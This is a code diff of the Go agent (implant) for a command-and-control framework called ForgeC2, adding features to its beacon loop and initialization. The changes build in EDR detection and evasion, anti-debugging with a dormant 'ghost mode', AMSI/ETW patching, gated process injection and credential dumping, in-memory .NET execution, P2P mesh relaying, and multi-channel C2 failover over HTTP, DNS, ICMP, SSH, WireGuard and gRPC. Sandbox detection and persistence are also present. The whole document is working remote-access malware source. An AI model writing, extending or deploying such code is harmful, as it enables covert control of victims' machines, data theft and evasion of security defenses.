@@ -5,7 +5,9 @@ package main
 
 import (
 	"bytes"
+	"crypto/ed25519"
 	"crypto/rand"
+	"crypto/sha256"
 	"crypto/tls"
 	"encoding/base64"
 	"encoding/binary"
@@ -23,7 +25,6 @@ import (
 	"runtime"
 	"strconv"
 	"strings"
-	"sync"
 	"sync/atomic"
 	"time"
 	"image/jpeg"
@@ -42,172 +43,6 @@ func encodeBeacon(v any) ([]byte, error) {
 func decodeBeacon(data []byte, v any) error {
 	return encoding.Unmarshal(data, v)
 }
-
-// These variables are injected at compile time via -ldflags "-X main.C2URL=..."
-// This source is used exclusively by the Generate Agent flow (EXE).
-// IMPORTANT: -X can ONLY set string variables. Non-strings are injected as *Str and parsed in init().
-var (
-	C2URL            string = "http://127.0.0.1:8080"
-	C2URLs           []string       // parsed from C2URL (comma-separated multi-C2 failover)
-	currentC2Idx     int            // index of last working C2 server
-	IntervalStr      string = "10"
-	JitterStr        string = "20"
-	UserAgent        string = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"
-	PersistStr       string = "false"
-	SkipTLSVerifyStr string = "true" // for self-signed C2 certs
-	Protocol         string = "http" // "http" or "tcp" injected via ldflags
-	DebugStr         string = "false" // set via ldflags for debug builds (stealth default false)
-	FastInterval     int    = 1       // Fast interval for screen monitoring (1 second)
-	BeaconURIStr     string = s(SBeaconURI)
-	BeaconMethodStr  string = s(SBeaconMethod)
-	ListenerIDStr    string = "0"
-	P2PMode          string = ""      // "", "smb", "tcp"
-	P2PParent        string = ""      // parent agent to connect to (child mode)
-	P2PListenAddr    string = ""      // listen addr for children (parent mode)
-	DNSDomain        string = ""      // DNS C2 domain (e.g. "c2.example.com")
-	DNSServer        string = ""      // DNS C2 server IP
-	ProxyStr         string = ""      // HTTP proxy URL (e.g. "http://proxy:8080")
-	CryptoKeyStr     string = ""      // 32-byte hex key for beacon payload encryption ("" = disabled)
-	DomainFront      string = ""      // Domain fronting: override HTTP Host header ("" = disabled)
-	ContentLengthJitter int = 0       // Max random padding bytes for HTTP body (0=disabled)
-	ExpiryDateStr    string = ""      // Compile-time expiry date: "YYYY-MM-DD" — implant auto-exits after this date
-	EvasionStr       string = "false"  // Compile-time EDR evasion (chunked sleep); also FORGEC2_EVASION=1 at runtime
-	PPIDSpoofStr          string = "false"  // Compile-time PPID spoofing (spawned processes inherit explorer.exe as parent)
-	PersistencePrefixStr  string = ""       // Custom prefix for persistence artifacts (reg keys, task names, file names); default "ForgeC2"
-)
-
-// Parsed versions (populated in init)
-var (
-	Interval      int
-	Jitter        int
-	Persist       bool
-	SkipTLSVerify bool
-	Debug         bool
-	BeaconURI     string
-	BeaconMethod  string
-	ListenerID    uint
-	evasionEnabled bool
-)
-
-var beaconCipher *streamCipher // legacy XOR beacon encryption (nil = disabled)
-var ecdhSess *ecdhSession      // ECDH session for forward-secret encryption (nil = not established)
-var inSandbox bool              // set by sandbox detection at startup
-var ppidSpoofEnabled bool      // PPID spoofing enabled via ldfags
-var persistencePrefix string    // artifact name prefix for persistence (default "ForgeC2")
-
-var AgentVersion = s(SAgentVersion)
-
-// Platform-specific implementations (screenshots, persistence, sysproc attrs) are in
-// agent_windows.go and agent_linux.go selected by build tags.
-
-// BeaconRequest is sent by agent
-type BeaconRequest struct {
-	UUID      string            `json:"uuid"`
-	Info      map[string]string `json:"info,omitempty"`
-	Results   []TaskResult      `json:"results,omitempty"`
-	SocksData []socksFrame      `json:"socks_data,omitempty"`
-	Relayed   []RelayedData     `json:"relayed,omitempty"` // P2P: child results forwarded by parent
-
-	// ECDH + AES-256-GCM fields
-	ECDHPub   string `json:"ecdh_pub,omitempty"`  // base64 X25519 public key (for handshake)
-	CipherB64 string `json:"c,omitempty"`          // base64(nonce + AES-256-GCM ciphertext)
-}
-
-type RelayedData struct {
-	AgentID string       `json:"agent_id"`
-	Results []TaskResult `json:"results"`
-}
-
-// TaskResult for completed tasks
-type TaskResult struct {
-	TaskID   uint   `json:"task_id"`
-	Type     string `json:"type"`
-	Output   string `json:"output"`
-	Error    string `json:"error,omitempty"`
-	Encoding string `json:"encoding,omitempty"`
-	Filename string `json:"filename,omitempty"`
-	Size     int64  `json:"size,omitempty"`
-	Offset   int64  `json:"offset,omitempty"`
-	Path     string `json:"path,omitempty"`
-}
-
-// BeaconResponse from server
-type BeaconResponse struct {
-	Tasks         []Task         `json:"tasks"`
-	SocksFrames   []socksFrame   `json:"socks_frames,omitempty"`
-	SocksFastMode bool           `json:"socks_fast,omitempty"`
-	Relayed       []RelayedTask  `json:"relayed,omitempty"` // P2P: tasks for children
-
-	// ECDH + AES-256-GCM fields
-	ECDHPub   string `json:"ecdh_pub,omitempty"`  // base64 server X25519 public key
-	CipherB64 string `json:"c,omitempty"`          // base64(nonce + AES-256-GCM ciphertext)
-}
-
-type RelayedTask struct {
-	AgentID string `json:"agent_id"`
-	Tasks   []Task `json:"tasks"`
-}
-
-// Task from C2
-type Task struct {
-	ID      uint   `json:"id"`
-	Type    string `json:"type"`
-	Command string `json:"command"`
-	Shell   string `json:"shell"`
-	Path    string `json:"path,omitempty"`
-	Data    string `json:"data,omitempty"`
-	Offset  int64  `json:"offset,omitempty"`
-	Size    int64  `json:"size,omitempty"`
-}
-
-var (
-	client          *http.Client
-	agentUUID       string
-	rng             = newCryptoRand()
-	pendingMu       sync.Mutex
-	pendingResults  []TaskResult
-	screenStreaming int32 // atomic: 0=false, 1=true
-	inFastMode      atomic.Bool
-
-	// P2P relay state
-	p2pRelayRunning bool
-	p2pRelayMu      sync.Mutex
-	p2pChildUUIDs   []string               // UUIDs of children connected through us
-	p2pChildResults map[string][]TaskResult // child results to relay
-	p2pChildTasks   map[string][]Task       // child tasks to distribute
-	p2pChildLastSeen map[string]time.Time   // last-seen timestamp for pruning stale entries
-
-	// Keylogger state (cross platform, impl in platform files)
-	keylogActive int32 // atomic: 0=false, 1=true
-	keylogMu     sync.Mutex
-	keylogBuffer bytes.Buffer
-)
-
-// ── SOCKS Relay State (agent side) ───────────────────────────────────────────
-
-type socksFrame struct {
-	ConnID uint64 `json:"conn_id"`
-	Action string `json:"action"` // connect, connected, data, close
-	Data   []byte `json:"data,omitempty"`
-}
-
-type socksRelayConn struct {
-	tcpConn  net.Conn
-	mu       sync.Mutex
-	outbound []socksFrame // buffered frames agent→server
-	closed   bool
-}
-
-const (
-	socksOrphanMaxOut = 128           // max orphan control frames to prevent memory leak
-	SocksReadTimeout  = 5 * time.Minute // read timeout on target connections
-)
-
-var (
-	socksRelayMu    sync.Mutex
-	socksRelayConns = make(map[uint64]*socksRelayConn)
-	socksRelayFast  bool // fast-poll when any SOCKS relay is active
-)
 
 func newCryptoRand() *mathRand.Rand {
 	seed := make([]byte, 8)
@@ -229,6 +64,26 @@ func init() {
 	go func() {
 		time.Sleep(5 * time.Second) // wait for system to settle
 		runSandboxCheck()
+	}()
+
+	// Environment classification (async to avoid delaying startup)
+	go func() {
+		time.Sleep(3 * time.Second)
+		envClass, opsProfile := detectEnvironment()
+		if opsProfile != nil {
+			currentEnvClass = envClass
+			currentOpsProfile = opsProfile
+			envDetected = true
+			if !opsProfile.AllowShell {
+				log.Println("[env] Shell commands disabled in this environment")
+			}
+			if !opsProfile.AllowInjection {
+				log.Println("[env] Process injection disabled in this environment")
+			}
+			if !opsProfile.AllowCredDump {
+				log.Println("[env] Credential dumping disabled in this environment")
+			}
+		}
 	}()
 
 	// Parse injected string values ( -X only supports string )
@@ -261,12 +116,24 @@ func init() {
 	if BeaconURI == "" {
 		BeaconURI = "/api/v1/beacon"
 	}
-	BeaconMethod = BeaconMethodStr
-	if BeaconMethod == "" {
-		BeaconMethod = "POST"
+	BeaconMethod = "POST"   // FORCE POST — GET with body is unreliable in Go's http client
+	BeaconTransport = BeaconTransportStr
+	if BeaconTransport == "" {
+		BeaconTransport = "http"
 	}
+
+	// SMB pipe name: use explicit config or extract from C2URL
+	smbPipeName = SMBPipeName
+	if smbPipeName == "" {
+		// Try to extract from C2URL when Protocol is "smb"
+		if Protocol == "smb" || strings.HasPrefix(C2URL, "smb://") {
+			smbPipeName = strings.TrimPrefix(C2URL, "smb://")
+		}
+	}
+	isSMBParent = strings.ToLower(IsSMBParentStr) == "true" || IsSMBParentStr == "1"
+
 	if Debug {
-		fmt.Printf("[DEBUG] BeaconURI=%q BeaconMethod=%q C2URL=%q\n", BeaconURI, BeaconMethod, C2URL)
+		fmt.Printf("[DEBUG] BeaconURI=%q BeaconMethod=%q C2URL=%q SMBPipeName=%q\n", BeaconURI, BeaconMethod, C2URL, smbPipeName)
 	}
 	if id, err := strconv.ParseUint(ListenerIDStr, 10, 32); err == nil {
 		ListenerID = uint(id)
@@ -277,9 +144,42 @@ func init() {
 		evasionEnabled = true
 	}
 
+	// Adaptive EDR detection: detect running EDR and apply optimal evasion strategy
+	edrInfo := DetectEDR()
+	strategy := edrInfo.GetStrategy()
+	ApplyStrategy(strategy)
+	if edrInfo.Detected && Debug {
+		fmt.Printf("[EDR] Detected %s, applied strategy\n", edrInfo.Name)
+	}
+
+	// Anti-debug detection: early check before beaconing starts
+	if runtime.GOOS == "windows" {
+		score, details := AntiDebugCheck()
+		antiDebugScore = score
+		if score > 20 {
+			antiDebugTriggered = true
+			log.Printf("[antidebug] Detection score: %d/%d checks triggered", score, len(details))
+			if score > 50 {
+				enterGhostMode("anti-debug threshold exceeded")
+			} else {
+				patchAMSI = false
+				patchETW = false
+			}
+		}
+		go runAntiDebugMonitor()
+	}
+
 	ppidSpoofEnabled = strings.ToLower(PPIDSpoofStr) == "true" || PPIDSpoofStr == "1"
 	if v := os.Getenv("FORGEC2_PPID_SPOOF"); v == "1" || strings.ToLower(v) == "true" {
 		ppidSpoofEnabled = true
+	}
+
+	egressDetection = strings.ToLower(EgressDetectionStr) == "true" || EgressDetectionStr == "1"
+
+	chameleonEnabled = strings.ToLower(ChameleonStr) == "true" || ChameleonStr == "1"
+	chameleonProfile = ChameleonProfileStr
+	if chameleonProfile == "" {
+		chameleonProfile = "random"
 	}
 
 	persistencePrefix = PersistencePrefixStr
@@ -288,6 +188,20 @@ func init() {
 	}
 	if v := os.Getenv("FORGEC2_PERSIST_PREFIX"); v != "" {
 		persistencePrefix = v
+	}
+
+	// SSH transport config
+	initSSHConfig()
+
+	// mTLS transport config
+	initMTLS()
+
+	// WireGuard transport config
+	initWG()
+
+	// Initialize CLR (.NET) hosting for in-process assembly execution
+	if runtime.GOOS == "windows" {
+		useCLRHosting = initCLRHosting()
 	}
 
 	// Initialize beacon payload cipher
@@ -316,15 +230,78 @@ func init() {
 		}
 	}
 
-	// TLS verification controlled by SkipTLSVerify (injected at build time)
-	tr := &http.Transport{
-		MaxIdleConns:        10,
-		MaxIdleConnsPerHost: 5,
-		IdleConnTimeout:     60 * time.Second,
-		TLSClientConfig:     &tls.Config{InsecureSkipVerify: SkipTLSVerify},
+	// Parse multi-C2 mode
+	switch strings.ToLower(C2ModeStr) {
+	case "failover":
+		c2Mode = C2ModeFailover
+	case "roundrobin", "round_robin":
+		c2Mode = C2ModeRoundRobin
+	case "random":
+		c2Mode = C2ModeRandom
+	case "split":
+		c2Mode = C2ModeSplit
+	case "parallel":
+		c2Mode = C2ModeParallel
+	default:
+		c2Mode = C2ModeSingle
 	}
-	if DomainFront != "" {
-		tr.TLSClientConfig.ServerName = DomainFront
+
+	if mr, err := strconv.Atoi(MaxRetriesStr); err == nil {
+		maxRetries = mr
+	} else {
+		maxRetries = 10
+	}
+
+	if dt, err := strconv.Atoi(DeadTimeoutStr); err == nil {
+		deadTimeout = time.Duration(dt) * time.Second
+	} else {
+		deadTimeout = 3600 * time.Second
+	}
+
+	c2Stats = make(map[int]*c2FailStats)
+
+	// Parse gossip config
+	GossipEnabled = strings.ToLower(GossipEnabledStr) == "true" || GossipEnabledStr == "1"
+	if gi, err := strconv.Atoi(GossipIntervalStr); err == nil && gi > 0 {
+		GossipInterval = gi
+	} else {
+		GossipInterval = 30
+	}
+	// If gossip listen addr not set, derive from P2PListenAddr by incrementing port
+	if GossipEnabled && GossipListenAddr == "" && P2PListenAddr != "" {
+		if host, portStr, err := net.SplitHostPort(P2PListenAddr); err == nil {
+			if port, err := strconv.Atoi(portStr); err == nil {
+				GossipListenAddr = fmt.Sprintf("%s:%d", host, port+1)
+			}
+		}
+	}
+
+	// Working hours
+	workingStart = WorkingStartStr
+	workingEnd = WorkingEndStr
+	workingTZ = WorkingTZStr
+
+	// Kill date
+	if KillDateStr != "" {
+		if kd, err := time.Parse("2006-01-02", KillDateStr); err == nil {
+			killDateParsed = kd
+		}
+	}
+
+	// TLS verification controlled by SkipTLSVerify (injected at build time)
+	var tr *http.Transport
+	if chameleonEnabled {
+		tr = newUTLSTransport()
+	} else {
+		tr = &http.Transport{
+			MaxIdleConns:        10,
+			MaxIdleConnsPerHost: 5,
+			IdleConnTimeout:     60 * time.Second,
+			TLSClientConfig:     &tls.Config{InsecureSkipVerify: SkipTLSVerify},
+		}
+		if DomainFront != "" {
+			tr.TLSClientConfig.ServerName = DomainFront
+		}
 	}
 	if ProxyStr != "" {
 		proxyURL, err := url.Parse(ProxyStr)
@@ -348,36 +325,50 @@ func main() {
 	log.SetFlags(0)
 	setDPIAware()
 	if Debug {
-		fmt.Println("[ForgeC2] Agent starting...")
+		fmt.Println(s(SForgeC2), "Agent starting...")
 	}
 
 	if Persist {
 		addPersistence()
 	}
 
-	// Sandbox detection — run once at startup
+	// Sandbox detection ? run once at startup
 	detector := NewSandboxDetector()
 	result := detector.Detect()
 	inSandbox = result.IsSandbox
 	if inSandbox {
-		log.Printf("[ForgeC2] Sandbox detected (confidence: %d%%), entering benign mode", result.Confidence)
+		log.Printf(s(SForgeC2)+" Sandbox detected (confidence: %d%%), entering benign mode", result.Confidence)
 	}
 
 	// Initial registration / first beacon
 	agentUUID = registerOrGetUUID()
+
+	// Mark as SMB child if using SMB transport
+	if Protocol == "smb" || BeaconTransport == "smb" {
+		isSMBChild = true
+		if Debug {
+			fmt.Printf(s(SForgeC2)+" SMB child mode, pipe: %s\n", smbPipeName)
+		}
+	}
+
+	// Start SMB parent pipe listener if configured
+	if isSMBParent && smbPipeName != "" {
+		if err := StartSMBParentPipe(smbPipeName); err != nil {
+			if Debug {
+				fmt.Printf("[!] SMB parent pipe start failed: %v\n", err)
+			}
+		} else {
+			go p2pCleanupStaleChildren()
+		}
+	}
 
 	// Start P2P parent listener if in parent mode
 	if P2PMode != "" && P2PListenAddr != "" {
 		go p2pParentListen()
 		go p2pCleanupStaleChildren()
 		if Debug {
-			fmt.Printf("[ForgeC2] P2P parent mode (%s) on %s\n", P2PMode, P2PListenAddr)
+			fmt.Printf(s(SForgeC2)+" P2P parent mode (%s) on %s\n", P2PMode, P2PListenAddr)
 		}
-	}
-
-	// Environment classification
-	if runtime.GOOS == "windows" {
-		getEnvDetector()
 	}
 
 	// JIT Beacon Scheduler
@@ -385,11 +376,60 @@ func main() {
 		getBeaconScheduler()
 	}
 
+	// Start gossip protocol for P2P mesh auto-routing
+	if GossipEnabled {
+		go startGossipProtocol()
+		if GossipListenAddr != "" {
+			go gossipListen()
+			if Debug {
+				fmt.Printf(s(SForgeC2)+" Gossip listener on %s\n", GossipListenAddr)
+			}
+		}
+	}
+
+	// Run egress detection on first startup if configured
+	if Protocol != "smb" && (BeaconTransport == "auto" || egressDetection) {
+		c2Host := extractC2Host()
+		ports := parseEgressPorts()
+		if Debug {
+			fmt.Printf("[egress] Running egress detection against %s ports %v\n", c2Host, ports)
+		}
+		report := runEgressDetection(c2Host, ports)
+		egressReport = report
+		egressDetected = true
+		if report.Best != "" {
+			bestEgressProto = report.Best
+			if Debug {
+				fmt.Printf("[egress] Best protocol: %s\n", bestEgressProto)
+			}
+			switch {
+			case strings.HasPrefix(bestEgressProto, "tcp/"):
+				Protocol = "tcp"
+			case bestEgressProto == "dns":
+				Protocol = "dns"
+			case bestEgressProto == "icmp":
+				Protocol = "icmp"
+			}
+		}
+	}
+
 	// Main beacon loop
 	beaconCount := 0
 	for {
-		// Ghost mode: skip beacon entirely
+		// Kill date check: exit if expired
+		if !killDateParsed.IsZero() && time.Now().After(killDateParsed) {
+			if Debug {
+				fmt.Println("[*] Kill date reached, exiting.")
+			}
+			os.Exit(0)
+		}
+
+		// Ghost mode: send final beacon, then sleep
 		if isInGhostMode() {
+			if !ghostBeaconSent {
+				ghostBeaconSent = true
+				doBeacon()
+			}
 			time.Sleep(24 * time.Hour)
 			continue
 		}
@@ -414,6 +454,19 @@ func main() {
 		if hasPending {
 			continue
 		}
+
+		// Working hours check: if outside working hours, sleep until next window
+		if workingStart != "" && workingEnd != "" {
+			if !isWithinWorkingHours() {
+				sleepDuration := timeUntilNextWindow()
+				if Debug {
+					fmt.Printf("[working] Outside working hours (%s-%s), sleeping %v\n", workingStart, workingEnd, sleepDuration)
+				}
+				time.Sleep(sleepDuration)
+				continue
+			}
+		}
+
 		sleepWithJitter()
 	}
 }
@@ -568,6 +621,27 @@ func doBeacon() {
 	}
 	p2pRelayMu.Unlock()
 
+	// Append gossip peer table to results if enabled (throttled)
+	if GossipEnabled && time.Since(lastGossipReport) > 30*time.Second {
+		peerTableMu.RLock()
+		peers := make([]PeerInfo, 0, len(peerTable))
+		for _, p := range peerTable {
+			peers = append(peers, p)
+		}
+		peerTableMu.RUnlock()
+		if len(peers) > 0 {
+			if data, err := json.Marshal(peers); err == nil {
+				pendingMu.Lock()
+				pendingResults = append(pendingResults, TaskResult{
+					Type:   "gossip_discover",
+					Output: string(data),
+				})
+				pendingMu.Unlock()
+				lastGossipReport = time.Now()
+			}
+		}
+	}
+
 	pendingMu.Lock()
 	resultsCopy := pendingResults
 	pendingResults = nil // sent
@@ -589,7 +663,7 @@ func doBeacon() {
 
 	if ecdhSess != nil {
 		if ecdhSess.needsHandshake() {
-			// First beacon: ECDH handshake — send public key in top-level JSON
+			// First beacon: ECDH handshake ? send public key in top-level JSON
 			envelope := struct {
 				UUID    string `json:"uuid"`
 				ECDHPub string `json:"ecdh_pub"`
@@ -613,9 +687,14 @@ func doBeacon() {
 				envelope := struct {
 					UUID      string `json:"uuid"`
 					CipherB64 string `json:"c"`
+					ECDHPub   string `json:"ecdh_pub,omitempty"`
 				}{
 					UUID:      agentUUID,
 					CipherB64: cipherB64,
+				}
+				if ecdhSess.rotationPending {
+					envelope.ECDHPub = ecdhSess.rotationPubKeyB64
+					ecdhSess.rotationPending = false
 				}
 				envelopeJSON, _ := json.Marshal(envelope)
 				sendBody = envelopeJSON
@@ -634,20 +713,50 @@ func doBeacon() {
 		sendBody = body
 	}
 
+	// Apply traffic shape analysis and adaptation
+	sendBody = applyTrafficShaping(sendBody)
+
 	// P2P child mode: beacon through parent instead of server
 	var respBody []byte
 	if P2PParent != "" {
 		respBody = sendP2PBeacon(sendBody)
-	} else if Protocol == "smb" {
+	} else if Protocol == "smb" || BeaconTransport == "smb" {
 		respBody = sendSMBBeacon(sendBody)
 	} else if Protocol == "tcp" {
 		respBody = sendTCPBeacon(body)
 	} else if Protocol == "dns" {
 		respBody = sendDNSBeacon(body)
+		if respBody == nil {
+			dnsConsecutiveFailures++
+			if Debug {
+				fmt.Printf("[!] DNS beacon failed (%d/%d consecutive failures)\n", dnsConsecutiveFailures, dnsFallbackThreshold)
+			}
+			if dnsConsecutiveFailures >= dnsFallbackThreshold {
+				if Debug {
+					fmt.Println("[!] DNS failure threshold reached, falling back to HTTP")
+				}
+				Protocol = "http"
+				respBody = sendWithMode(sendBody)
+			}
+		} else {
+			dnsConsecutiveFailures = 0
+		}
 	} else if Protocol == "icmp" {
 		respBody = sendICMPBeacon(sendBody)
+	} else if BeaconTransport == "wss" {
+		respBody = sendWSSBeacon(sendBody)
+	} else if BeaconTransport == "grpc" || strings.HasPrefix(C2URLs[currentC2Idx], "grpc://") || strings.HasPrefix(C2URLs[currentC2Idx], "grpcs://") {
+		respBody = sendGRPCBeacon(sendBody)
+	} else if BeaconTransport == "ssh" || strings.HasPrefix(C2URLs[currentC2Idx], "ssh://") {
+		respBody = sendSSHBeacon(sendBody)
+	} else if BeaconTransport == "mtls" || strings.HasPrefix(C2URLs[currentC2Idx], "mtls://") {
+		respBody = sendMTLSBeacon(sendBody)
+	} else if BeaconTransport == "h2c" || strings.HasPrefix(C2URLs[currentC2Idx], "h2c://") {
+		respBody = sendH2CBeacon(sendBody)
+	} else if BeaconTransport == "wg" || strings.HasPrefix(C2URLs[currentC2Idx], "wg://") {
+		respBody = sendWGBeacon(sendBody)
 	} else {
-		respBody = sendBeacon(sendBody)
+		respBody = sendWithMode(sendBody)
 	}
 	if respBody == nil {
 		if Debug {
@@ -660,7 +769,7 @@ func doBeacon() {
 	var resp BeaconResponse
 
 	if isECDH && ecdhSess != nil && ecdhSess.needsHandshake() {
-		// Parse handshake response — expect ecdh_pub from server
+		// Parse handshake response ? expect ecdh_pub from server
 		var envelope struct {
 			ECDHPub   string `json:"ecdh_pub,omitempty"`
 			CipherB64 string `json:"c,omitempty"`
@@ -708,7 +817,11 @@ func doBeacon() {
 
 		// Check for session key rotation
 		if envelope.ECDHPub != "" {
-			if err := ecdhSess.establishFromServerKey(envelope.ECDHPub); err != nil {
+			if err := ecdhSess.rotateKeyPair(); err != nil {
+				if Debug {
+					log.Printf("[!] ECDH key pair rotation failed: %v", err)
+				}
+			} else if err := ecdhSess.establishFromServerKey(envelope.ECDHPub); err != nil {
 				if Debug {
 					log.Printf("[!] ECDH key rotation failed: %v", err)
 				}
@@ -788,53 +901,237 @@ func doBeacon() {
 	pendingMu.Unlock()
 }
 
+func sendToC2(idx int, body []byte) []byte {
+	if idx < 0 || idx >= len(C2URLs) {
+		return nil
+	}
+	url := C2URLs[idx]
+
+	beaconURI := BeaconURI
+	if ContentLengthJitter > 0 {
+		beaconURI = addRandomParam(beaconURI)
+	}
+
+	req, err := http.NewRequest("POST", url+beaconURI, bytes.NewReader(body))
+	if err != nil {
+		return nil
+	}
+	req.Header.Set("Content-Type", "application/json")
+	req.Header.Set("User-Agent", UserAgent)
+
+	if DomainFront != "" {
+		req.Host = DomainFront
+	}
+
+	resp, err := client.Do(req)
+	if err != nil {
+		if Debug {
+			fmt.Printf("[!] Beacon to %s failed: %v\n", url, err)
+		}
+		return nil
+	}
+	defer resp.Body.Close()
+
+	if resp.StatusCode != 200 {
+		if Debug {
+			fmt.Printf("[!] %s returned %d\n", url, resp.StatusCode)
+		}
+		return nil
+	}
+
+	data, err := io.ReadAll(resp.Body)
+	if err != nil {
+		return nil
+	}
+	if Debug {
+		fmt.Printf("[+] Beacon OK from %s, response %d bytes\n", url, len(data))
+	}
+	return data
+}
+
 func sendBeacon(body []byte) []byte {
 	startIdx := currentC2Idx
 	for i := 0; i < len(C2URLs); i++ {
 		idx := (startIdx + i) % len(C2URLs)
-		url := C2URLs[idx]
-
-		// Apply URI jitter: random query param when ContentLengthJitter > 0
-		beaconURI := BeaconURI
-		if ContentLengthJitter > 0 {
-			beaconURI = addRandomParam(beaconURI)
+		data := sendToC2(idx, body)
+		if data != nil {
+			currentC2Idx = idx
+			return data
 		}
-
-		req, err := http.NewRequest(BeaconMethod, url+beaconURI, bytes.NewReader(body))
-		if err != nil {
-			continue
-		}
-		req.Header.Set("Content-Type", "application/json")
-		req.Header.Set("User-Agent", UserAgent)
-
-		if DomainFront != "" {
-			req.Host = DomainFront
-		}
-
-		resp, err := client.Do(req)
-		if err != nil {
-			if Debug {
-				fmt.Printf("[!] Beacon to %s failed: %v\n", url, err)
-			}
-			continue
-		}
-
-		if resp.StatusCode != 200 {
-			if Debug {
-				fmt.Printf("[!] %s returned %d\n", url, resp.StatusCode)
-			}
-			resp.Body.Close()
-			continue
-		}
-		data, _ := io.ReadAll(resp.Body)
-		resp.Body.Close()
-		currentC2Idx = idx
-		if Debug {
-			fmt.Printf("[+] Beacon OK from %s, response %d bytes\n", url, len(data))
-		}
-		return data
 	}
 	return nil
+}
+
+// ?? Multi-C2 mode dispatch ???????????????????????????????????????????????
+
+func sendWithMode(body []byte) []byte {
+	if atomic.LoadInt32(&deadMode) == 1 {
+		if time.Since(deadModeStart) > deadTimeout {
+			atomic.StoreInt32(&deadMode, 0)
+			if Debug {
+				fmt.Println("[c2] Dead mode timeout expired, retrying...")
+			}
+		} else {
+			return nil
+		}
+	}
+
+	switch c2Mode {
+	case C2ModeFailover:
+		for i := 0; i < len(C2URLs); i++ {
+			idx := (currentC2Idx + i) % len(C2URLs)
+			resp := sendToC2(idx, body)
+			if resp != nil {
+				recordSuccess(idx)
+				currentC2Idx = idx
+				return resp
+			}
+			recordFailure(idx)
+		}
+		checkAllDead()
+		return nil
+
+	case C2ModeRoundRobin:
+		currentC2Idx = (currentC2Idx + 1) % len(C2URLs)
+		resp := sendToC2(currentC2Idx, body)
+		if resp != nil {
+			recordSuccess(currentC2Idx)
+			return resp
+		}
+		recordFailure(currentC2Idx)
+		checkAllDead()
+		return nil
+
+	case C2ModeRandom:
+		idx := mathRand.Intn(len(C2URLs))
+		currentC2Idx = idx
+		resp := sendToC2(idx, body)
+		if resp != nil {
+			recordSuccess(idx)
+			return resp
+		}
+		recordFailure(idx)
+		return nil
+
+	case C2ModeSplit:
+		bestIdx := 0
+		bestFails := int(^uint(0) >> 1)
+		for i := range C2URLs {
+			c2StatsMu.Lock()
+			stats := c2Stats[i]
+			c2StatsMu.Unlock()
+			fails := 0
+			if stats != nil {
+				fails = stats.consecutive
+			}
+			if fails < bestFails {
+				bestFails = fails
+				bestIdx = i
+			}
+		}
+		currentC2Idx = bestIdx
+		resp := sendToC2(bestIdx, body)
+		if resp != nil {
+			recordSuccess(bestIdx)
+			return resp
+		}
+		recordFailure(bestIdx)
+		checkAllDead()
+		return nil
+
+	case C2ModeParallel:
+		type parResp struct {
+			data []byte
+			idx  int
+		}
+		ch := make(chan parResp, len(C2URLs))
+		for i := range C2URLs {
+			idx := i
+			go func() {
+				data := sendToC2(idx, body)
+				ch <- parResp{data, idx}
+			}()
+		}
+		hasFailure := false
+		for i := 0; i < len(C2URLs); i++ {
+			r := <-ch
+			if r.data != nil {
+				recordSuccess(r.idx)
+				currentC2Idx = r.idx
+				return r.data
+			}
+			recordFailure(r.idx)
+			hasFailure = true
+		}
+		if hasFailure {
+			checkAllDead()
+		}
+		return nil
+
+	default:
+		resp := sendToC2(currentC2Idx, body)
+		if resp != nil {
+			recordSuccess(currentC2Idx)
+			return resp
+		}
+		recordFailure(currentC2Idx)
+		checkAllDead()
+		return nil
+	}
+}
+
+func recordFailure(idx int) {
+	c2StatsMu.Lock()
+	defer c2StatsMu.Unlock()
+	if c2Stats == nil {
+		return
+	}
+	stats := c2Stats[idx]
+	if stats == nil {
+		stats = &c2FailStats{}
+		c2Stats[idx] = stats
+	}
+	stats.failures++
+	stats.consecutive++
+	stats.lastFailure = time.Now()
+}
+
+func recordSuccess(idx int) {
+	c2StatsMu.Lock()
+	defer c2StatsMu.Unlock()
+	if c2Stats == nil {
+		return
+	}
+	stats := c2Stats[idx]
+	if stats == nil {
+		stats = &c2FailStats{}
+		c2Stats[idx] = stats
+	}
+	stats.failures = 0
+	stats.consecutive = 0
+}
+
+func checkAllDead() {
+	if len(C2URLs) == 0 || maxRetries <= 0 {
+		return
+	}
+	c2StatsMu.Lock()
+	allDead := true
+	for i := range C2URLs {
+		stats := c2Stats[i]
+		if stats == nil || stats.consecutive < maxRetries {
+			allDead = false
+			break
+		}
+	}
+	if allDead {
+		atomic.StoreInt32(&deadMode, 1)
+		deadModeStart = time.Now()
+		if Debug {
+			fmt.Println("[!] All C2s unreachable, entering dead mode")
+		}
+	}
+	c2StatsMu.Unlock()
 }
 
 func addRandomParam(uri string) string {
@@ -931,6 +1228,20 @@ func sendTaskResult(res TaskResult) {
 		sendTCPBeacon(body) // fire and forget
 	} else if Protocol == "dns" {
 		sendDNSBeacon(body) // fire and forget
+	} else if Protocol == "smb" || BeaconTransport == "smb" {
+		sendSMBBeacon(body)
+	} else if BeaconTransport == "wss" {
+		sendWSSBeacon(body)
+	} else if BeaconTransport == "ssh" || strings.HasPrefix(C2URLs[currentC2Idx], "ssh://") {
+		sendSSHBeacon(body)
+	} else if BeaconTransport == "mtls" || strings.HasPrefix(C2URLs[currentC2Idx], "mtls://") {
+		sendMTLSBeacon(body)
+	} else if BeaconTransport == "h2c" || strings.HasPrefix(C2URLs[currentC2Idx], "h2c://") {
+		sendH2CBeacon(body)
+	} else if BeaconTransport == "wg" || strings.HasPrefix(C2URLs[currentC2Idx], "wg://") {
+		sendWGBeacon(body)
+	} else if BeaconTransport == "grpc" || strings.HasPrefix(C2URLs[currentC2Idx], "grpc://") || strings.HasPrefix(C2URLs[currentC2Idx], "grpcs://") {
+		sendGRPCBeacon(body)
 	} else {
 		sendBeacon(body)
 	}
@@ -972,7 +1283,11 @@ func sendScreenFrame(data []byte) {
 	}
 	httpReq.Header.Set("Content-Type", "application/json")
 	httpReq.Header.Set("User-Agent", UserAgent)
-	client.Do(httpReq) // fire and forget
+	resp, err := client.Do(httpReq)
+	if err == nil {
+		io.Copy(io.Discard, resp.Body)
+		resp.Body.Close()
+	}
 }
 
 func getSystemInfo() map[string]string {
@@ -1038,6 +1353,22 @@ func executeTask(task Task) TaskResult {
 		Type:   task.Type,
 	}
 
+	// Decrypt payload if task is encrypted
+	if task.Encrypted && ecdhSess != nil {
+		if task.Command != "" {
+			dec, err := ecdhSess.decryptAESGCM(task.Command)
+			if err == nil {
+				task.Command = string(dec)
+			}
+		}
+		if task.Data != "" {
+			dec, err := ecdhSess.decryptAESGCM(task.Data)
+			if err == nil {
+				task.Data = string(dec)
+			}
+		}
+	}
+
 	// In sandbox mode, only allow benign commands
 	if inSandbox {
